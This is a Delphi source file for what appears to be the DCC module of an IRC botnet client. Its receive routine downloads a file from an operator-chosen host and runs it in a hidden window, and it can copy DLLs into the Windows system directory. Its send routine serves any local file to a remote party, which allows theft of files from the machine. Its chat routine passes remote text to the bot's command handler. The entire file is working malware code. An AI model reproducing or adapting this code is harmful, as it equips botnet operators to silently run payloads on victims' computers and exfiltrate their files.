unit untDCC;

interface

uses
  windows, winsock, ShellAPI;

{$I config.ini}

Type
  TFileInfo = Record
    Name        :String;
    Host        :String;
    Address     :String;
    Port        :Integer;
    Size        :Integer;
  End;
  PFileInfo = ^TFileInfo;

  TFileTransfer = Class(TObject)
  Public
    FileInfo    :TFileInfo;
    procedure ReceiveFile(Name: String; Port: Integer; Host: String; Size: Integer);
    procedure SendFile(Name: String; Port: Integer; Size: Integer);
    Procedure AcceptChat(Name, Host, Address: String; Port: Integer);
  End;

implementation

uses untBot, untFunctions;

function FileExists(const FileName: string): Boolean;
var
lpFindFileData: TWin32FindData;
hFile: Cardinal;
begin
  hFile := FindFirstFile(PChar(FileName), lpFindFileData);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    result := True;
    Windows.FindClose(hFile)
  end
  else
    result := False;
end;

function ExtractFileName(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    end;
  end;
end;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

function DoAcceptChat(P: Pointer): Dword; STDCALL;
Var
  Sock  :TSocket;
  Addr  :TSockAddr;
  Buffer:Array[0..12285] Of Char;
  WSA   :TWSAData;
  Data  :String;

  Host   :String;
  Port   :Integer;
  Name   :String;
  Address:String;
Begin
  Result := 0;

  Host := pFileInfo(P)^.Host;
  Port := pFileInfo(P)^.Port;
  Name := pFileInfo(P)^.Name;
  Address := pFileInfo(P)^.Address;

  If (Port = 0) Then
  Begin
    Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[CHAT] No port set'#10, False, BOT.IRC.Sock);
    Exit;
  End;

  WSAStartUp(MakeWord(2,2), WSA);
    Sock := Socket(AF_INET, SOCk_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(Port);
    Addr.sin_addr.S_addr := inet_Addr(pChar(Address));

    if (Connect(Sock, Addr, SizeOf(Addr)) = SOCKET_ERROR) Then
    Begin
      Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[CHAT] Error calling Connect()'#10, False, BOT.IRC.Sock);
      Exit;
    End;

    Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[CHAT] Connection Established'#10, False, BOT.IRC.Sock);

    While TRUE Do
    Begin
      FillChar(Buffer, SizeOf(Buffer), 0);
      If (Recv(Sock, Buffer, SizeOf(Buffer), 0) <= 0) Then
        Break;
      Data := String(Buffer);
      If (Length(Data) < 3) Then Continue;

      Data := Name + '!' + Host + ' PRIVMSG '+Bot.Nick+' :'+Data;
      Bot.IsChat := True;
      Bot.ReadCommands(Data, Sock);
    End;

    Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[CHAT] Connection lost.'#10, False, BOT.IRC.Sock);

  WSACleanUP;
End;

function DoReceiveFile(P: Pointer): Dword; STDCALL;
Var
  WSA   :TWSAData;
  F     :FILE;
  Err   :Integer;
  Sock  :TSocket;
  Addr  :TSockAddr;
  Recv1 :Integer;
  Recv2 :LongInt;
  Buffer:Array[0..12285] Of Char;

  Name  :String;
  Host  :String;
  Port  :Integer;

  Dir   :Array[0..255] Of Char;
  Path  :String;
  Ext   :String;
Begin
  Result := 0;
  Port := PFileInfo(P)^.Port;
  Name := PFileInfo(P)^.Name;
  Host := PFileInfo(P)^.Host;

  If Port = 0 Then
  Begin
    Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] No port set'#10, False, BOT.IRC.Sock);
    Exit;
  End;

  Recv1 := 0;

  WSAStartUp(MakeWord(2,2), WSA);
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(Port);
    Addr.sin_addr.S_addr := inet_Addr(pChar(Host));

    {$I-}
    While TRUE Do
    Begin
      AssignFile(F, Name);
      ReWrite(F, 1);
      If Sock < 0 Then
      Begin
        Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] Error calling Socket()'#10, False, BOT.IRC.Sock);
        Break;
      End;

      If Connect(Sock, Addr, SizeOf(Addr)) = SOCKET_ERROR Then
      Begin
        Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] Error calling Connect()'#10, False, BOT.IRC.Sock);
        Break;
      End;

      Err := 1;
      While Err <> 0 Do
      Begin
        FillChar(Buffer, SizeOf(Buffer), 0);
        Err := Recv(Sock, Buffer, SizeOf(Buffer), 0);

        If Err = 0 Then Break;
        If Err = SOCKET_ERROR Then
        Begin
          Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] Error in Filetransfer'#10, False, BOT.IRC.Sock);
          CloseFile(F);
          CloseSocket(Sock);
          Break;
        End;
        BlockWrite(F, Buffer[0], Err);
        Inc(Recv1, Err);
        Recv2 := hTonl(Recv1);
        Send(Sock, Recv2, 4, 0);
      End;
      Break;
    End;
    CloseFile(F);
    CloseSocket(Sock);
    {$I+}
  WSACleanUp;
  Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] File received successful'#10, False, BOT.IRC.Sock);

  Ext := Copy(Name, Length(Name)-2, 3);
  If (LowerCase(ext) = 'stub') Then
  Begin
    Path := GetDirectory(bot_placescript)+bot_scriptdir+'\'+Name;
    CopyFile(pChar(Name), pChar(Path), False);
  End Else
  If (LowerCase(ext) <> 'dll') Then
    ShellExecute(0, 'open', pchar(Name), nil, nil, 0)
  Else Begin
    If (bot_copydll = TRUE) Then
    Begin
      GetSystemDirectory(Dir, 256);
      Path := String(Dir)+'\'+Name;
      CopyFile(pChar(Name), pChar(Path), False);
    End;
  End;
End;

function DoSendFile(P: Pointer): Dword; STDCALL;
var
  wsa   :TWSAData;
  sock  :TSocket;
  sock2 :TSocket;
  Addr  :TSockAddr;
  AddrIn:TSockAddrIn;
  Time  :TTimeVal;
  FDS   :TFDSet;
  Size  :Integer;
  TestFile: FILE;
  Len   :Integer;
  FSend :Integer;
  Buffer:Array[0..12285] Of Char;
  Mode  :Dword;
  Bytes_Sent:Integer;
  Err2  :Integer;

  Name  :String;
  Port  :Integer;
Begin
  Result := 0;
  Name := PFileInfo(P)^.Name;
  Port := PFileInfo(P)^.Port;

  If Port = 0 Then
  Begin
    Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] No port set'#10, False, BOT.IRC.Sock);
    Exit;
  End;

  If Not FileExists(Name) Then
  Begin
    Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] File doesnt exist'#10, False, BOT.IRC.Sock);
    Exit;
  End;

  WSAStartUp(MakeWord(2,2), WSA);
    Sock := Socket(PF_INET, SOCK_STREAM, 0);
    AddrIn.sin_family := AF_INET;
    AddrIn.sin_port := hTons(Port);
    Addrin.sin_addr.S_addr := INADDR_ANY;

    Bind(Sock, AddrIn, SizeOf(AddrIn));

    If WinSock.Listen(Sock, 5) <> 0 Then
    Begin
      Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] Error calling Listen()'#10, False, BOT.IRC.Sock);
      CloseSocket(Sock);
      WSACleanUP;
      Exit;
    End;

    Time.tv_sec := 60;
    Time.tv_usec := 0;
    FD_ZERO(FDS);
    FD_SET(Sock, FDS);
    If Select(0, @FDS, NIL, NIL, @TIME) <= 0 Then
    Begin
      Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] Error, Timedout'#10, False, BOT.IRC.Sock);
      CloseSocket(Sock);
      WSACleanUP;
      Exit;
    End;

    Size := SizeOf(TSockAddr);
    Sock2 := Winsock.Accept(Sock, @Addr, @Size);

    AssignFile(TestFile, Name);
    FileMode := 0;
    Reset(TestFile, 1);
    Len := FileSize(TestFile);
    Mode := 0;

    While Len > 0 Do
    Begin
      FSend := 12285;
      FillChar(Buffer, SizeOf(Buffer), 0);
      If FSend > Len Then FSend := Len;

      BlockRead(TestFile, Buffer, FSend, Mode);
      Bytes_Sent := Send(Sock2, Buffer, FSend, 0);

      Err2 := Recv(Sock2, Buffer, SizeOf(Buffer), 0);
      If (Err2 < 1) Or (Bytes_Sent < 1) Then
      Begin
        Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] Error in Filetransfer'#10, False, BOT.IRC.Sock);
        CloseSocket(Sock2);
        Exit;
      End;
      Dec(Len, Bytes_Sent);
    End;
    CloseFile(TestFile);

    CloseSocket(Sock2);
    CloseSocket(Sock);
  WSACleanUp;
  Bot.SendData('PRIVMSG ' + Bot.Channel + ' :[DCC] File sent successful'#10, False, BOT.IRC.Sock);
End;

Procedure TFileTransfer.AcceptChat(Name, Host, Address: String; Port: Integer);
Var
  ThreadID: Dword;
Begin
  FileInfo.Name := Name;
  FileInfo.Host := Host;
  FileInfo.Port := Port;
  FileInfo.Address := Address;

  CreateThread(NIL, 0, @DoAcceptChat, @FileInfo, 0, ThreadID);
End;

procedure TFileTransfer.ReceiveFile(Name: String; Port: Integer; Host: String; Size: Integer);
var
  ThreadID: Dword;
Begin
  FileInfo.Name := Name;
  FileInfo.Port := Port;
  FileInfo.Host := Host;
  FileInfo.Size := Size;

  CreateThread(NIL, 0, @DoReceiveFile, @FileInfo, 0, ThreadID);
End;

procedure TFileTransfer.SendFile(Name: String; Port: Integer; Size: Integer);
var
  ThreadID: Dword;
Begin
  FileInfo.Name := Name;
  FileInfo.Port := Port;
  FileInfo.Host := '';
  FileInfo.Size := Size;

  CreateThread(NIL, 0, @DoSendFile, @FileInfo, 0, ThreadID);
End;

end.
